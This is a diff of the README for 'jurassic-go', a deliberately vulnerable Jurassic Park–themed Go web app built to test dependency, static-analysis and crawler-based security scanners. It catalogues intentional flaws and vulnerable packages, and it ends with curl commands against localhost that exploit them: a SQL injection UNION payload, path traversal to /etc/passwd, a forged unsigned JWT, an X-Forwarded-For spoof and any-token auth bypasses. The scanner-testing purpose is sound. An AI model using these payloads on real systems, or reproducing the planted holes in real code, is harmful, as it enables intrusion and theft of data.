@@ -1,73 +1,111 @@
-# 🦖 `jurassic-go` — InGen Isla Nublar Park Operations API
+# 🦖 `jurassic-go` — Jurassic Park System
 
-> *"Spared No Expense — except on `go.mod` dependency upgrades and API authentication."*
+> *"Spared no expense"* — except on dependency upgrades, authentication, and input validation.
 
-`jurassic-go` is a standalone, zero-database Go web application built to test **Software Composition Analysis (SCA)** across source manifests (`go.mod`) and compiled container binaries (`.go.buildinfo`), **Attack Surface Management (ASM)**, and **Red Agent Web-Crawler / Shadow API discovery**.
+`jurassic-go` is a small, deliberately vulnerable Go web app modeled on the **Jurassic Park System** from the 1993 film: the Visitor Center kiosk, the control room's Irix terminal (Nedryland, "System Security Interface, Version 4.0.5, Alpha"), Dennis Nedry's `whte_rbt.obj`, the security grid, main power, the animal census, embryo cold storage, and the FSN file browser ("It's a UNIX system!").
+
+It is a test target for four detection layers:
+
+| Layer | What should detect it |
+| :--- | :--- |
+| **SCA** | Dependency scanning of `go.mod`, the compiled binary (`.go.buildinfo`), and the Go standard library |
+| **Rule-based SAST** | Opengrep / Semgrep rules (single file, pattern based) |
+| **AI SAST only** | Semantic and business-logic analysis — rule-based SAST misses these |
+| **ASM / Red Agent** | Web crawling and dynamic probing of the running app |
+
+> [!WARNING]
+> Do not deploy this app on a network you care about. Every weakness is intentional.
 
 ---
 
-## Implemented Vulnerabilities & Expected Scanner Findings (CVE & CWE Matrix)
+## Park systems and endpoints
 
-| CVE | CWE | Severity | Package / Endpoint & Version | Code Usage / Reachability | Expected Scanner Detection |
+| Park system | Route | In `/swagger.json`? | Found in | Auth |
+| :--- | :--- | :---: | :--- | :--- |
+| Visitor Center kiosk | `GET /` | — | crawler seed | public |
+| Control room (Irix terminal) | `GET /control-room` | — | link on `/`, `robots.txt` | public |
+| Park status + Earthwatch weather | `GET /api/v1/park/status` | ✅ | Swagger, `visitor-kiosk.js` | public |
+| Tour vehicles (Ford Explorers on the electric track) | `GET /api/v1/tour/vehicles` | ✅ | Swagger, `visitor-kiosk.js` | public |
+| Animal census (paddock motion sensors) | `GET /api/v1/animals/census?species=` | ✅ | Swagger, `visitor-kiosk.js` | public |
+| Visitor tour pass (JWT) | `POST /api/v1/visitors/pass`, `GET /api/v1/visitors/me` | ✅ | Swagger, `visitor-kiosk.js` | public / tour pass |
+| Personnel roster | `GET /api/v1/system/personnel` | ❌ | `/static/visitor-kiosk.js` | **any** Bearer token |
+| Incident reports | `GET /api/v1/system/incidents`, `GET /api/v1/system/incidents/:id` | ❌ | `/static/visitor-kiosk.js` | tour pass |
+| FSN file browser | `GET /api/v1/system/fsn?path=` | ❌ | `/static/jpss-console.js` | none |
+| Embryo cold storage | `GET /api/v1/system/cold-storage` | ❌ | `/static/jpss-console.js` | none |
+| Main power (maintenance shed) | `POST /api/v1/system/power` | ❌ | `/static/jpss-console.js` | spoofable IP check |
+| Security grid (`whte_rbt.obj`) | `POST /api/v1/system/security-grid` | ❌ | `/static/jpss-console.js` | **any** Bearer token |
+| Central Park Control Console | `POST /api/v1/system/command` | ❌ | `/static/jpss-console.js` | magic word |
+
+Console commands (`POST /api/v1/system/command`): `tour initiate`, `system raptors`, `whte_rbt.obj`, `access security`, `access security grid`, `access main security grid`, `safety -o`, `keychecks -o`. After `whte_rbt.obj`, the `access ...` commands return *"AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"* until you send the magic word.
+
+Data for the census and the incident reports is in an embedded in-memory **SQLite** database (`modernc.org/sqlite`, pure Go), so the SQL injection and IDOR are exploitable without external services.
+
+---
+
+## Implemented issues and expected findings
+
+| CVE | CWE | Severity | Package / park system | Code usage | Expected detection |
 | :--- | :--- | :--- | :--- | :--- | :--- |
-| **CVE-2020-26160** | **CWE-287** (Improper Authentication)<br>**CWE-347** (Improper Signature Verification) | `HIGH` | `github.com/dgrijalva/jwt-go` (`v3.2.0+incompatible`) | Function called directly (`jwt.NewWithClaims` & `jwt.Parse`) in `POST /api/v1/visitors/pass` | Flagged by all SCA scanners (`go.mod`, container binary `.go.buildinfo`, and function call-graph reachability) |
-| **CVE-2022-28948** | **CWE-400** (Uncontrolled Resource Consumption)<br>**CWE-502** (Deserialization of Untrusted Data) | `HIGH` | `gopkg.in/yaml.v2` (`v2.2.8`) | Function called directly (`yaml.Unmarshal`) in `POST /api/v1/internal/paddock/override` | Flagged by all SCA scanners (`go.mod`, container binary `.go.buildinfo`, and function call-graph reachability) |
-| **CVE-2020-28483**<br>**CVE-2023-29401** | **CWE-20** (Improper Input Validation)<br>**CWE-434** (Unrestricted File Upload / Filename Handling) | `MEDIUM` | `github.com/gin-gonic/gin` (`v1.6.3`) | Function called directly (`gin.Default()` HTTP router) in `main.go` | Flagged across `go.mod` and container binary scans |
-| **CVE-2021-29272**<br>**CVE-2021-42576** | **CWE-79** (Cross-Site Scripting / Improper Input Neutralization) | `MEDIUM` | `github.com/microcosm-cc/bluemonday` (`v1.0.4`) | Blank import `_ "github.com/microcosm-cc/bluemonday"` only — vulnerable `Sanitize()` function is never called | Linked into binary `.go.buildinfo` (flagged by module & package SCA scanners; marked unreachable by function call-graph analysis) |
-| **CVE-2024-45337**<br>**CVE-2023-48795**<br>*(+23 additional `ssh` CVEs)* | **CWE-287** (Auth Bypass)<br>**CWE-354** (Improper Integrity Check)<br>**CWE-400** (Resource Exhaustion) | `CRITICAL` / `HIGH` | `golang.org/x/crypto` (`v0.0.0-20200709230013-948cd5f35899`) | Safe sibling package `golang.org/x/crypto/bcrypt` is called in `GET /api/v1/internal/employees/payroll` — vulnerable `golang.org/x/crypto/ssh` subpackage is never imported | Flagged by module-level scanners (Wiz CLI) in `go.mod` and container binary; pruned by package import-graph scanners (Snyk CLI) |
-| **CVE-2021-38561**<br>**CVE-2022-32149** | **CWE-787** (Out-of-Bounds Write)<br>**CWE-400** (Resource Consumption / DoS) | `HIGH` | `golang.org/x/text` (`v0.3.3`) | Safe sibling package `golang.org/x/text/transform` is called in `GET /api/v1/dinosaurs` — vulnerable `golang.org/x/text/language` subpackage is never imported | Flagged by module-level scanners (Wiz CLI) in `go.mod` and container binary; pruned by package import-graph scanners (Snyk CLI) |
-| **CVE-2026-63209**<br>**CVE-2026-116591** | **CWE-190** (Integer Overflow)<br>**CWE-125** (Out-of-Bounds Read) | `HIGH` | `github.com/klauspost/compress` (`v1.9.5`) | Subpackage `compress/zstd` is called in `GET /api/v1/internal/genetics/research` (transitively importing `fse` & `huff0`), while `compress/s2` is never imported | Wiz CLI flags unimported `compress/s2` (`CVE-2026-63209`); Snyk CLI prunes `s2` and flags imported `compress/fse` & `huff0` (`CVE-2026-116591`) |
-| **CVE-2020-27813** | **CWE-190** (Integer Overflow / Frame Length DoS) | `HIGH` | `github.com/gorilla/websocket` (`v1.4.0`) | Declared in `go.mod` / `go.sum` only — never imported in any `.go` file | Flagged in `go.mod` directory scans; stripped completely by the Go compiler from the compiled container binary (`.go.buildinfo`) |
-| **CVE-2025-22871**<br>**CVE-2024-45338**<br>*(+33 Go `stdlib` CVEs)* | **CWE-444** (HTTP Request Smuggling)<br>**CWE-295** (Improper Certificate Validation)<br>**CWE-400** (Resource Exhaustion) | `CRITICAL` / `HIGH` | Go Standard Library (`golang:1.21-alpine` / `go1.21.13` in `Dockerfile`) | Standard library runtime (`net/http`, `crypto/tls`, `encoding/json`) compiled into `/app/jurassic-go` | Not flagged in `go.mod` directory scans; flagged in container binary scans (`--scan-go-standard-library` / container image SCA) |
-| *N/A (API / App)* | **CWE-287** (Improper Authentication)<br>**CWE-306** (Missing Authentication for Critical Function) | `HIGH` | `GET /api/v1/internal/visitors/incidents`<br>`GET /api/v1/internal/genetics/research` | Undocumented endpoints omitted from `/swagger.json` and referenced in `/static/park-ops.js` & `/static/ingen-internal.js`; accessible without authentication | Discovered by ASM / Red Agent web crawler via JavaScript inspection and flagged for unauthenticated confidential data exposure |
-| *N/A (API / App)* | **CWE-287** (Improper Authentication)<br>**CWE-290** (Authentication Bypass by Spoofing) | `CRITICAL` | `GET /api/v1/internal/employees/payroll`<br>`POST /api/v1/internal/paddock/override` | Undocumented endpoints referenced in client-side JS; middleware checks for `Authorization: Bearer <token>` prefix but accepts any arbitrary non-empty token without verification | Discovered by ASM / Red Agent web crawler via JavaScript inspection and flagged for Authentication Bypass via Arbitrary Bearer Token |
-| *N/A (API / App)* | **CWE-1059** (Insufficient Technical Documentation / Shadow API)<br>**CWE-200** (Exposure of Sensitive Information) | `MEDIUM` | `/swagger.json` vs. `/static/park-ops.js`, `/admin-console`, `/static/ingen-internal.js`, `/robots.txt` | `/swagger.json` documents only 3 public routes, while 4 internal routes exposing salaries, bcrypt hashes, NDAs, and fence overrides are embedded in client-side JS | Discovered by ASM / Red Agent web crawler comparing OpenAPI spec against crawled HTML/JS endpoints |
+| **CVE-2020-26160** | CWE-287, CWE-347 | HIGH | `github.com/dgrijalva/jwt-go` v3.2.0+incompatible — tour pass | `jwt.NewWithClaims`, `jwt.Parse` called | **SCA** |
+| **CVE-2022-28948** | CWE-400, CWE-502 | HIGH | `gopkg.in/yaml.v3` v3.0.0-20210107192922 — security grid | `yaml.Unmarshal` on the request body | **SCA** |
+| **CVE-2020-28483**, **CVE-2023-29401**, **CVE-2023-26125** | CWE-20, CWE-434 | HIGH / MEDIUM | `github.com/gin-gonic/gin` v1.6.3 | HTTP router | **SCA** |
+| **CVE-2021-42576**, **CVE-2021-29272** | CWE-79 | HIGH / MEDIUM | `github.com/microcosm-cc/bluemonday` v1.0.4 | Blank import `_` only; `Sanitize()` never called | **SCA** (unreachable by call graph) |
+| **CVE-2024-45337**, **CVE-2023-48795** (+ other `ssh` CVEs) | CWE-287, CWE-354, CWE-400 | CRITICAL / HIGH | `golang.org/x/crypto` 2020-07-09 — personnel hashes | Only `bcrypt` used; `ssh` never imported | **SCA** (module-level scanners); pruned by package-level scanners |
+| **CVE-2021-38561**, **CVE-2022-32149** | CWE-787, CWE-400 | HIGH | `golang.org/x/text` v0.3.3 — census tags | Only `transform` used; `language` never imported | **SCA** (module-level); pruned by package-level |
+| **CVE-2026-63209** | CWE-190 | HIGH | `github.com/klauspost/compress` v1.9.5 — cold storage telemetry | Only `zstd` used; `s2` never imported | **SCA** (module-level) |
+| **CVE-2020-27813**, **GHSA-w67g-5rqw-f597** | CWE-190 | HIGH / MEDIUM | `github.com/gorilla/websocket` v1.4.0 | Only in `go.mod`; never imported | **SCA** on `go.mod`; absent from the compiled binary |
+| Go stdlib CVEs (e.g. **CVE-2025-22871**) | CWE-444, CWE-295, CWE-400 | CRITICAL / HIGH | Go 1.21 (`golang:1.21-alpine`) | Compiled into `/app/jurassic-go` | **SCA** on the container image only |
+| — | **CWE-89** SQL injection | HIGH | Animal census | `fmt.Sprintf` into `QueryContext` with the `species` query parameter | **Rule-based SAST**, Red Agent |
+| — | **CWE-22** path traversal | MEDIUM | FSN file browser | `os.ReadFile` on the `path` query parameter | **Rule-based SAST**, Red Agent |
+| — | **CWE-327** JWT `none` algorithm | MEDIUM | Tour pass | `jwt.UnsafeAllowNoneSignatureType` accepted in `parseTourPass` | **Rule-based SAST**, Red Agent |
+| — | **CWE-327** insecure TLS | HIGH | Cold storage → Site B telemetry | `tls.Config{MinVersion: tls.VersionTLS10, InsecureSkipVerify: true}` | **Rule-based SAST** |
+| — | **CWE-319**, **CWE-400** | MEDIUM | HTTP server | `http.ListenAndServe` without TLS or timeouts | **Rule-based SAST** |
+| — | **CWE-306** missing authentication | MEDIUM / HIGH | Cold storage, FSN, console | Gin routes registered without auth middleware | **Rule-based SAST** (Gin rule — also flags public routes), Red Agent |
+| — | **CWE-287 / CWE-290** auth bypass | CRITICAL | Personnel, security grid | `arbitraryBearerAuthMiddleware` checks the `Bearer ` prefix but never verifies the token | **AI SAST only**, Red Agent |
+| — | **CWE-290** spoofing | CRITICAL | Main power | `getMaintenanceShedClientIP` trusts the leftmost `X-Forwarded-For` value for the `10.19.93.0/24` allowlist | **AI SAST only**, Red Agent |
+| — | **CWE-639** IDOR | HIGH | Incident reports | `/incidents/:id` uses a parameterized query but omits the `visitor_account_id` filter that the list endpoint has | **AI SAST only**, Red Agent |
+| — | **CWE-798** hard-coded credentials | CRITICAL | JWT signing key, magic word | `getJWTSecret()` and `getMagicWord()` fall back to constants | **AI SAST only** |
+| — | **CWE-1059**, **CWE-200** shadow API | MEDIUM | All `/api/v1/system/*` routes | Missing from `/swagger.json`; only in the JS bundles | **ASM / Red Agent crawler** |
 
 ---
 
-## Endpoint Overview
-
-| Route | Documented in `/swagger.json`? | Where Referenced | Authentication | Description |
-| :--- | :---: | :--- | :--- | :--- |
-| `GET /` | No | HTML Root | Public | Isla Nublar Visitor Portal HTML; loads `/static/park-ops.js` and links to `/swagger.json` & `/admin-console`. |
-| `GET /admin-console` | No | Linked in `/` & `/robots.txt` | Public | InGen Control Room Console HTML; loads `/static/ingen-internal.js`. |
-| `GET /robots.txt` | No | Crawler standard | Public | Disallows `/admin-console`, `/static/ingen-internal.js`, and `/api/v1/internal/`. |
-| `GET /swagger.json` | Yes | Linked in `/` | Public | OpenAPI 3.0 spec listing **only** the 3 public endpoints below. |
-| `GET /api/v1/park/status` | **Yes** | `/swagger.json` & `/static/park-ops.js` | Public | Isla Nublar weather, power grid, and 10,000V perimeter fence status. |
-| `GET /api/v1/dinosaurs` | **Yes** | `/swagger.json` & `/static/park-ops.js` | Public | Famous Jurassic Park dinosaur inventory (`Rexy`, `The Big One`, `Dilophosaurus`, `Brachiosaurus`, `Triceratops`). |
-| `POST /api/v1/visitors/pass` | **Yes** | `/swagger.json` & `/static/park-ops.js` | Public | Issues signed visitor tour JWT passes (`github.com/dgrijalva/jwt-go`). |
-| `GET /api/v1/internal/visitors/incidents` | **No** | `/static/park-ops.js` | **Unauthenticated** (`CWE-306`) | Confidential VIP endorsement dossier (Grant, Sattler, Malcolm, Gennaro) & unreleased worker fatality NDA settlements (`Jophery Brown — $2.4M`). |
-| `GET /api/v1/internal/employees/payroll` | **No** | `/static/park-ops.js` | **Arbitrary Bearer Token Bypass** (`CWE-287` / `CWE-290`) | Rejects missing header with `401 ("Ah ah ah! You didn't say the magic word!")`, but accepts **any** non-empty `Authorization: Bearer <token>` to dump InGen salaries (Hammond, Dr. Wu, Ray Arnold, Muldoon, Dennis Nedry's Biosyn bribe) and `bcrypt` hashes. |
-| `GET /api/v1/internal/genetics/research` | **No** | `/static/ingen-internal.js` | **Unauthenticated** (`CWE-306`) | Classified Site B (`Isla Sorna`) frog-DNA (`Hyperolius viridiflavus`) splicing logs, failing lysine contingency notes, and Barbasol embryo cold-storage inventory. |
-| `POST /api/v1/internal/paddock/override` | **No** | `/static/ingen-internal.js` | **Arbitrary Bearer Token Bypass** (`CWE-287` / `CWE-290`) | Accepts any non-empty `Authorization: Bearer <token>` and parses YAML body via `gopkg.in/yaml.v2` (`yaml.Unmarshal`) to disable 10,000V perimeter fences (`white_rabbit_object`). |
-
----
-
-## Quick Start & Verification Commands
+## Run and verify
 
 ```bash
-# Build & run locally (-mod=mod keeps unimported gorilla/websocket in go.mod)
-CGO_ENABLED=0 go build -mod=mod -o jurassic-go .
-./jurassic-go
+CGO_ENABLED=0 go build -mod=mod -o jurassic-go . && ./jurassic-go
+# or: docker build -t jurassic-go . && docker run -p 8080:8080 jurassic-go
 
-# 1. Public OpenAPI Spec (lists only the 3 public endpoints)
-curl -s http://localhost:8080/swagger.json | jq .
+B=http://localhost:8080
 
-# 2. Undocumented Endpoint — Unauthenticated VIP Visitor & Worker Fatality NDAs (CWE-306)
-curl -s http://localhost:8080/api/v1/internal/visitors/incidents | jq .
+# SQL injection in the animal census (CWE-89)
+curl -s -G "$B/api/v1/animals/census" \
+  --data-urlencode "species=zzz' UNION SELECT id, title, settlement, location, 0, 0, details FROM incidents--"
 
-# 3. Undocumented Endpoint — Missing Bearer Token (401 "Ah ah ah! You didn't say the magic word!")
-curl -i http://localhost:8080/api/v1/internal/employees/payroll
+# Tour pass, then IDOR on another visitor's incident (CWE-639)
+TP=$(curl -s -X POST $B/api/v1/visitors/pass -H 'Content-Type: application/json' -d '{"visitor_name":"Dr. Alan Grant"}' | jq -r .tour_pass)
+curl -s $B/api/v1/system/incidents -H "Authorization: Bearer $TP"     # only Grant's incident
+curl -s $B/api/v1/system/incidents/6 -H "Authorization: Bearer $TP"   # Biosyn embryo theft
 
-# 4. Undocumented Endpoint — Arbitrary Bearer Token Bypass (CWE-287 / CWE-290: 200 OK with any Bearer string)
-curl -s -H "Authorization: Bearer literally-anything-works" http://localhost:8080/api/v1/internal/employees/payroll | jq .
+# Unsigned "none" tour pass (CWE-327)
+H=$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+P=$(printf '%s' '{"sub":"Hammond","account_id":99}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+curl -s $B/api/v1/visitors/me -H "Authorization: Bearer $H.$P."
 
-# 5. Undocumented Endpoint — Unauthenticated Site B Genetics & Barbasol Embryos (CWE-306)
-curl -s http://localhost:8080/api/v1/internal/genetics/research | jq .
+# Any Bearer token works (CWE-287)
+curl -s $B/api/v1/system/personnel -H 'Authorization: Bearer literally-anything'
 
-# 6. Undocumented Endpoint — Arbitrary Bearer Token Bypass + YAML Fence Override (CVE-2022-28948)
-curl -s -X POST http://localhost:8080/api/v1/internal/paddock/override \
-  -H "Authorization: Bearer white_rabbit_object" \
-  -H "Content-Type: application/x-yaml" \
-  --data-binary $'magic_word: please\ndisable_fences: true\nwhite_rabbit_object: ENABLED\ntarget_paddocks:\n  - Paddock 9 (T-Rex)\noverride_reason: East Dock Biosyn Run\n' | jq .
+# FSN path traversal (CWE-22)
+curl -s "$B/api/v1/system/fsn?path=/etc/passwd"
+
+# Main power via a spoofed X-Forwarded-For (CWE-290)
+curl -s -X POST $B/api/v1/system/power -H 'X-Forwarded-For: 10.19.93.7' -H 'Content-Type: application/json' -d '{"action":"off"}'
+
+# Nedry's terminal
+curl -s -X POST $B/api/v1/system/command -H 'Content-Type: application/json' -d '{"command":"whte_rbt.obj"}'
+curl -s -X POST $B/api/v1/system/command -H 'Content-Type: application/json' -d '{"command":"access main security grid"}'
+curl -s -X POST $B/api/v1/system/command -H 'Content-Type: application/json' -d '{"command":"access main security grid","magic_word":"please"}'
+
+# Security grid override with a YAML payload (yaml.v3)
+curl -s -X POST $B/api/v1/system/security-grid -H 'Authorization: Bearer nedry' \
+  --data-binary $'command: whte_rbt.obj\nsuspend_user_access: true\ndisable_fences:\n  - velociraptor\n'
 ```
